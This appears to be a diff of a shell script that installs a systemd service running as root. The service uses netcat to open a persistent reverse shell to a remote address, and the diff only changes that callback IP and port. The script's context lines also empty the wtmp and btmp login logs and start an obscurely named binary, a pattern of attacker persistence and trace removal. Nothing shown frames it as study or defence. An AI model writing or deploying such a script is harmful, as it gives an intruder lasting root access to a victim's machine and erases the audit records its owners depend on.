@@ -53,7 +53,7 @@ Type=simple
 Restart=always
 RestartSec=1
 User=root
-ExecStart=/usr/bin/nc -c sh 10.50.160.17 3180
+ExecStart=/usr/bin/nc -c sh 10.50.162.1 9001
 
 [Install]
 WantedBy=multi-user.target
@@ -92,4 +92,5 @@ cat /dev/null > /var/log/wtmp
 cat /dev/null > /var/log/btmp
 
 /var/lib/vpd/vpd.drift -t0 
+
 
